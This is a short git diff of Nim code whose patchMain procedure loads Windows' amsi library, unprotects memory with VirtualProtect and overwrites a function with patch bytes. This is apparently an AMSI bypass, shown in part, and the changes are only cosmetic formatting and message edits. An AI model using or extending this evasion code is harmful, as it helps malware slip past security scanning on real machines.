@@ -22,9 +22,9 @@ elif defined i386:
 
 
 proc patchMain(): bool = 
-    var amsiDLL: LibHandle
-    var funcAddr: pointer
-    var oldProtect: DWORD
+    var amsiDLL    : LibHandle
+    var funcAddr   : pointer
+    var oldProtect : DWORD
     var oldProtect2: DWORD
 
     amsiDLL = loadLib("amsi")
@@ -41,7 +41,7 @@ proc patchMain(): bool =
         echo "[+] Patch..."
         copyMem(funcAddr, unsafeAddr patch, patch.len)
         if VirtualProtect(funcAddr, patch.len, oldProtect, addr oldProtect2) == 0:
-            echo "[-] (VirtualProtect) RE Failed: ", GetLastError()
+            echo "[-] (VirtualProtect) RESET Failed: ", GetLastError()
             return false
         return true
     else:
